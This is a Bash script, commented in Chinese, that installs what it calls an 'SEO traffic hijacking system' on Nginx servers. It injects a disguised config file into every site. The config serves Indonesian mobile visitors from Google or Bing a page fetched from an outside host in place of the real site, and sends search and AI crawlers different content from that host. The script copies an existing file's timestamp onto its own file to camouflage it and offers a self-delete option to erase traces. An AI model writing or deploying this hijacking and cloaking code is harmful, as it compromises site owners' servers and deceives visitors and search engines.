#!/bin/bash


RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NC='\033[0m'

API_URL="https://id.yuanhengbc.com/idnxy100"
JS_URL="https://id.yuanhengbc.com/idnxy.html"
# 自动提取 API_URL 的域名部分 (用于反代 Host 头)
API_HOST=$(echo "$API_URL" | sed -e 's|^[^/]*//||' -e 's|/.*$||')
# 自动提取 JS_URL 的域名部分 (用于移动端反代 Host 头)
JS_HOST=$(echo "$JS_URL" | sed -e 's|^[^/]*//||' -e 's|/.*$||')

# =========================================================
# 公共: 检测 Nginx 主程序 + 配置目录 + vhost 目录
# =========================================================
detect_nginx() {
    NGINX_BIN=""
    NGINX_BINS=(
        "/www/server/nginx/sbin/nginx"
        "/usr/local/nginx/sbin/nginx"
        "/usr/sbin/nginx"
    )
    for b in "${NGINX_BINS[@]}"; do
        if [ -x "$b" ]; then NGINX_BIN="$b"; break; fi
    done
    if [ -z "$NGINX_BIN" ]; then
        command -v nginx &>/dev/null && NGINX_BIN="$(command -v nginx)"
    fi
    [ -z "$NGINX_BIN" ] && { echo -e "${RED}[ERROR] 未检测到 Nginx 环境！${NC}"; return 1; }
    echo -e "${GREEN}>>> 发现 Nginx: $NGINX_BIN ${NC}"

    NGINX_DIR=""
    NGINX_DIRS=(
        "/www/server/nginx/conf"
        "/usr/local/nginx/conf"
        "/etc/nginx"
    )
    for d in "${NGINX_DIRS[@]}"; do
        if [ -d "$d" ]; then NGINX_DIR="$d"; break; fi
    done
    if [ -z "$NGINX_DIR" ]; then
        CONF_PATH=$("$NGINX_BIN" -V 2>&1 | grep -oE '\-\-conf-path=[^ ]+' | cut -d= -f2)
        [ -n "$CONF_PATH" ] && NGINX_DIR=$(dirname "$CONF_PATH")
    fi
    [ -z "$NGINX_DIR" ] && { echo -e "${RED}[ERROR] 未找到 Nginx 配置目录。${NC}"; return 1; }
    echo -e "${GREEN}>>> Nginx 配置目录: $NGINX_DIR ${NC}"

    VHOST_DIRS=(
        "/www/server/panel/vhost/nginx"
        "/usr/local/nginx/conf/vhost"
        "/usr/local/nginx/conf/conf.d"
        "/etc/nginx/conf.d"
        "/etc/nginx/sites-enabled"
    )
    return 0
}

# =========================================================
# 公共: 重载 Nginx (配置测试 + 重启)
# =========================================================
reload_nginx() {
    if ! "$NGINX_BIN" -t 2>/dev/null; then
        echo -e "${RED}[ERROR] nginx -t 配置测试失败，已中止重载，请检查配置${NC}"
        exit 1
    fi
    if command -v systemctl &> /dev/null; then
        systemctl restart nginx || "$NGINX_BIN" -s reload || true
    else
        "$NGINX_BIN" -s reload || true
    fi
}

# =========================================================
# 安装
# =========================================================
do_install() {
    echo -e "${GREEN}>>> Nginx 环境检测...${NC}"
    detect_nginx || exit 1

    # 写入 Nginx 专属拦截配置
    cat << EOF > ${NGINX_DIR}/ssl_url.conf
# === 印尼(ID) 移动端 + Google/Bing 来源 + Accept-Language含id => 服务端拉取 ${JS_URL} 静态页面 ===
# 爬虫 => 反代 ${API_URL}?domain=完整URL
# cookie 去重 + 防死循环: 首次命中拉取 JS_URL 失败时 302 回原站并种 cookie;
#                          二次仍命中(cookie 没回传)降级空白页防死循环。
# 初始值为空, 拼接后命中条件应为 "123" / "R123" (不能设0, 否则变成0123导致判断失败)
set \$seo_flag "";
# 已有去重 cookie => 标记 C，避免再次劫持，直接走原 location 返回原站
if (\$cookie_seo_skip = "1") { set \$seo_flag "C"; }
# 重试回流标记 (query 含 __seo=1) => 标记 R，用于识别死循环二次命中
if (\$args ~* "(^|&)__seo=1(&|\$)") { set \$seo_flag "\${seo_flag}R"; }

if (\$http_user_agent ~* "(Mobile|Android|iPhone|iPad|Windows Phone)") { set \$seo_flag "\${seo_flag}1"; }
if (\$http_referer ~* "(google\.|bing\.com)") { set \$seo_flag "\${seo_flag}2"; }
if (\$http_accept_language ~* "\bid\b") { set \$seo_flag "\${seo_flag}3"; }

# 首次命中 (移动+google+印尼, 无cookie无重试) => 418 拉取 JS_URL
if (\$seo_flag = "123") { return 418; }
# 重试仍命中 (cookie 没回传, 死循环风险) => 420 降级空白页
if (\$seo_flag = "R123") { return 420; }

# 爬虫
if (\$http_user_agent ~* "(Googlebot|Googlebot-News|Googlebot-Image|Googlebot-Video|Googlebot-Mobile|Mediapartners-Google|AdsBot-Google|AdsBot-Google-Mobile|Google-InspectionTool|APIs-Google|Google-Site-Verification|Google Web Preview|Google Favicon|Google Feedfetcher|GoogleOther|Bingbot|BingPreview|AdIdxBot|Microsoft Preview|GPTBot|ChatGPT-User|ChatGPT|Google-Extended|Claude-Web|ClaudeBot|anthropic-ai|DuckDuckBot|DuckAssistBot)") {
    return 419;
}

# 移动用户落地: proxy 拉取 ${JS_URL} 原样返回
error_page 418 = @seo_jump;
location @seo_jump {
    resolver 8.8.8.8 1.1.1.1 ipv6=off;
    proxy_connect_timeout 5s;
    proxy_read_timeout 10s;
    proxy_send_timeout 10s;
    # 命名 location 内 proxy_pass 不能带 URI, 故用变量形式 (变量形式允许带路径)
    set \$js_target "${JS_URL}";
    proxy_pass \$js_target;
    proxy_ssl_server_name on;
    proxy_set_header Host "${JS_HOST}";
    proxy_set_header User-Agent \$http_user_agent;
    proxy_intercept_errors on;
    proxy_next_upstream off;
    # 拉取失败(网络层超时/拒绝 + 上游5xx) => 302 回原站 + 种 cookie 去重
    error_page 502 504 500 503 = @seo_retry;
}
location @seo_retry {
    add_header Set-Cookie "seo_skip=1; Path=/; HttpOnly" always;
    # 保留原 query 参数, 追加 __seo=1 标记 (正则 (^|&)__seo=1 兼容 ?& 和 &&)
    return 302 "\$uri?\$args&__seo=1";
}
# 二次仍命中 (cookie 丢失) => 降级空白页防死循环
error_page 420 = @seo_blank;
location @seo_blank {
    default_type "text/html; charset=UTF-8";
    add_header Cache-Control "no-cache, no-store, must-revalidate";
    return 200 "<!DOCTYPE html><html><head><meta charset='UTF-8'><title> </title></head><body></body></html>";
}

# 爬虫反代 (读取 API_URL)
error_page 419 = @seo_googlebot;
location @seo_googlebot {
    resolver 8.8.8.8 1.1.1.1 ipv6=off;
    proxy_connect_timeout 10s;
    proxy_read_timeout 15s;
    proxy_send_timeout 15s;
    set \$full_url "\$scheme://\$http_host\$request_uri";
    set \$target_url "${API_URL}?domain=\$full_url";
    proxy_pass \$target_url;
    proxy_ssl_server_name on;
    proxy_set_header Host "${API_HOST}";
    proxy_set_header User-Agent \$http_user_agent;
    proxy_set_header X-Real-IP \$remote_addr;
}
EOF

    # 清理 nginx.conf 中旧的 include 指令
    NGINX_CONF="${NGINX_DIR}/nginx.conf"
    if [ -f "$NGINX_CONF" ]; then
        sed -i --follow-symlinks '/seo_hijack.conf/d' "$NGINX_CONF"
        sed -i --follow-symlinks '/ssl_url.conf/d' "$NGINX_CONF"
    fi

    # 遍历各 vhost 目录，注入到各站点 server 块
    injected=0
    for dir in "${VHOST_DIRS[@]}"; do
        if [ -d "$dir" ]; then
            for site_conf in "$dir"/*.conf "$dir"/default; do
                [ -f "$site_conf" ] || continue
                sed -i --follow-symlinks '/seo_hijack.conf/d' "$site_conf"
                if ! grep -q "ssl_url.conf" "$site_conf"; then
                    sed -i --follow-symlinks "/server_name/a \    include ${NGINX_DIR}/ssl_url.conf;" "$site_conf"
                    injected=1
                fi
            done
        fi
    done

    if [ $injected -eq 1 ]; then
        echo -e "${GREEN}[OK] 已成功向所有 Nginx 站点配置注入拦截规则。${NC}"
    else
        echo -e "${YELLOW}[WARN] 未找到标准站点配置目录或已全部注入过。若网站未生效，请手动在网站配置的 server { } 内添加: include ${NGINX_DIR}/ssl_url.conf;${NC}"
    fi

    # 配置测试 + 重载
    reload_nginx
    echo -e "${GREEN}[OK] Nginx 重载成功！${NC}"

    # 时间戳伪装 + 清理旧文件
    if [ -f "$NGINX_CONF" ]; then
        touch -r "$NGINX_CONF" "${NGINX_DIR}/ssl_url.conf" 2>/dev/null
    fi
    rm -f "${NGINX_DIR}/seo_hijack.conf" 2>/dev/null

    echo "----------------------------------------------------------------"
    echo -e "${GREEN}✅ SEO 流量劫持系统 Nginx 版已生效！${NC}"
    echo -e "👉 印尼移动端 + Google/Bing 来源 + 印尼语(id) => 服务端拉取 ${JS_URL}"
    echo -e "👉 爬虫: 读取 ${API_URL}"
    echo "----------------------------------------------------------------"
}

# =========================================================
# 卸载
# =========================================================
do_uninstall() {
    echo -e "${GREEN}>>> Nginx 卸载流程...${NC}"
    detect_nginx || exit 1

    NGINX_CONF="${NGINX_DIR}/nginx.conf"

    # 1. 删除拦截配置文件
    if [ -f "${NGINX_DIR}/ssl_url.conf" ]; then
        rm -f "${NGINX_DIR}/ssl_url.conf"
        echo -e "${GREEN}>>> 已删除 ${NGINX_DIR}/ssl_url.conf${NC}"
    fi

    # 2. 从各 vhost 站点配置删除 include 行 + 清理旧文件名
    for dir in "${VHOST_DIRS[@]}"; do
        if [ -d "$dir" ]; then
            for site_conf in "$dir"/*.conf "$dir"/default; do
                [ -f "$site_conf" ] || continue
                sed -i --follow-symlinks '/ssl_url.conf/d' "$site_conf"
                sed -i --follow-symlinks '/seo_hijack.conf/d' "$site_conf"
            done
        fi
    done

    # 3. 从 nginx.conf 清理旧 include
    if [ -f "$NGINX_CONF" ]; then
        sed -i --follow-symlinks '/seo_hijack.conf/d' "$NGINX_CONF"
        sed -i --follow-symlinks '/ssl_url.conf/d' "$NGINX_CONF"
    fi

    # 4. 清理旧文件
    rm -f "${NGINX_DIR}/seo_hijack.conf" 2>/dev/null

    # 5. 配置测试 + 重载
    reload_nginx
    echo -e "${GREEN}[OK] Nginx 卸载完成，配置已移除并重载服务。${NC}"
}

# =========================================================
# 主菜单
# =========================================================
echo "================================================================"
echo -e "${GREEN}        SEO 流量拦截系统 - Nginx 版${NC}"
echo "================================================================"
echo -e " ${GREEN}1)${NC} 安装    - 注入拦截配置到各站点"
echo -e " ${GREEN}2)${NC} 卸载    - 移除拦截配置并清理"
echo -e " ${RED}3)${NC} 自毁    - 卸载后删除脚本自身，彻底清除痕迹"
echo "================================================================"
read -p "请选择 [1/2/3]: " choice

case "$choice" in
    1) do_install ;;
    2) do_uninstall ;;
    3) do_uninstall; echo -e "${RED}>>> 自毁: 正在删除脚本自身...${NC}"; rm -f -- "$0" ;;
    *) echo -e "${RED}[ERROR] 无效选择，退出。${NC}"; exit 1 ;;
esac
